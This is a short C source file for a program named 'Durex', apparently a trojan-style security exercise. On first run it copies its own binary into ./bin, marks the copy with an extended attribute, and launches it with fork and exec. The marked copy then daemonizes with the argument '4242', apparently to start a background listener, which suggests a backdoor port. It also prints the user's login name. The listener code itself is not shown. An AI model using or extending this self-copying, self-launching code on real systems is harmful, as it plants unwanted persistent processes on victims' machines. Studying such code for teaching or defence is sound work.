#include "durex.h"

int         g_ami_virtus; 
const char  *g_virtus_dir = "./bin";
const char  *g_virtus_path = "./bin/Durex";

void    check(const char *name)
{
    char    buf[4];

    getxattr(name, "virtus", buf, 3, 0, 0);
    if (strncmp(buf, "yes", 3) == 0)
        g_ami_virtus = 1;
    else 
        printf("%s\n", getlogin());
}

void     virtus(void)
{
    static const char *args[] = {"Durex", "-a", "4242"};
    deamon(4, args);
}

void     init(const char *name)
{
    struct stat sb; 
    int         virtus;
    int         this_file; 
    char        *file;

    virtus = open(g_virtus_path, O_CREAT | O_RDWR | O_TRUNC, 0766);
    this_file = open(name, O_RDONLY);
    if (virtus == -1 || this_file == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    fstat(this_file, &sb);
    file = (char *)mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE\
				, MAP_PRIVATE, this_file, 0);
    write(virtus, file, sb.st_size);
    setxattr(g_virtus_path, "virtus", "yes", 3, 0, 0);
    close(this_file);
    close(virtus);
    if (fork() == 0)
    {
        chdir(g_virtus_dir);
        execl("./Durex", "Durex", NULL);
    }
    else 
        exit(EXIT_SUCCESS);
}
int     main(int ac, char **av)
{
    check(av[0]);
    if (!g_ami_virtus)
        init(av[0]);
    else 
        virtus();
    return (0);
}